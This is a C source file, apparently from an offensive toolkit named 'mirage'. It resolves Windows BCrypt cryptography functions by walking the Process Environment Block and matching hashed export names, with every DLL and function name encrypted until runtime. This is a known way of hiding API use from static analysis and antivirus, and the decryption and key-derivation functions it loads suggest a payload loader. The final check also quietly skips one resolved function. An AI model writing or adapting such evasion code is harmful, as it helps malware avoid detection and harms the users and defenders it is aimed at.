/*
 * bcrypt_peb.c — PEB-resolved BCrypt API singleton
 *
 * Resolves all BCrypt functions from bcrypt.dll via PEB-walk
 * + hash-based export table parsing. Returns NULL if bcrypt.dll
 * is not loaded.
 */
#include "bcrypt_peb.h"
#include "config.h"
#include "enc_strings.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"

static bcrypt_api_t g_bcrypt;

const bcrypt_api_t *mirage_bcrypt_api(void) {
    if (g_bcrypt.ready) return &g_bcrypt;

    /* Resolve bcrypt.dll via PEB-walk */
    char dll[32];
    enc_decrypt(enc_bcrypt, ENC_BCRYPT_LEN, dll);
    void *mod = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!mod) return NULL;

    /* Resolve each function by encrypted name hash */
    char fn[40];

    enc_decrypt(enc_BCryptOpenAlgorithmProvider, ENC_BCRYPTOPENALGORITHMPROVIDER_LEN, fn);
    g_bcrypt.pOpen = (pBCryptOpenAlgorithmProvider)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptCloseAlgorithmProvider, ENC_BCRYPTCLOSEALGORITHMPROVIDER_LEN, fn);
    g_bcrypt.pClose = (pBCryptCloseAlgorithmProvider)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptSetProperty, ENC_BCRYPTSETPROPERTY_LEN, fn);
    g_bcrypt.pSetProp = (pBCryptSetProperty)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptGenerateSymmetricKey, ENC_BCRYPTGENERATESYMMETRICKEY_LEN, fn);
    g_bcrypt.pGenKey = (pBCryptGenerateSymmetricKey)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptDeriveKeyPBKDF2, ENC_BCRYPTDERIVEKEYPBKDF2_LEN, fn);
    g_bcrypt.pDerive = (pBCryptDeriveKeyPBKDF2)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptDecrypt, ENC_BCRYPTDECRYPT_LEN, fn);
    g_bcrypt.pDecrypt = (pBCryptDecrypt)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptDestroyKey, ENC_BCRYPTDESTROYKEY_LEN, fn);
    g_bcrypt.pDestroyKey = (pBCryptDestroyKey)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptCreateHash, ENC_BCRYPTCREATEHASH_LEN, fn);
    g_bcrypt.pCreateHash = (pBCryptCreateHash)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptHashData, ENC_BCRYPTHASHDATA_LEN, fn);
    g_bcrypt.pHashData = (pBCryptHashData)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptFinishHash, ENC_BCRYPTFINISHHASH_LEN, fn);
    g_bcrypt.pFinishHash = (pBCryptFinishHash)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptDestroyHash, ENC_BCRYPTDESTROYHASH_LEN, fn);
    g_bcrypt.pDestroyHash = (pBCryptDestroyHash)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_BCryptGenRandom, ENC_BCRYPTGENRANDOM_LEN, fn);
    g_bcrypt.pGenRandom = (pBCryptGenRandom)mirage_get_function_by_hash(
        mod, mirage_encrypted_hash_func(fn));

    /* Check all resolved */
    if (!g_bcrypt.pOpen || !g_bcrypt.pClose || !g_bcrypt.pSetProp ||
        !g_bcrypt.pGenKey || !g_bcrypt.pDerive || !g_bcrypt.pDecrypt ||
        !g_bcrypt.pDestroyKey || !g_bcrypt.pCreateHash || !g_bcrypt.pHashData ||
        !g_bcrypt.pFinishHash || !g_bcrypt.pDestroyHash) {
        return NULL;
    }

    g_bcrypt.ready = 1;
    return &g_bcrypt;
}
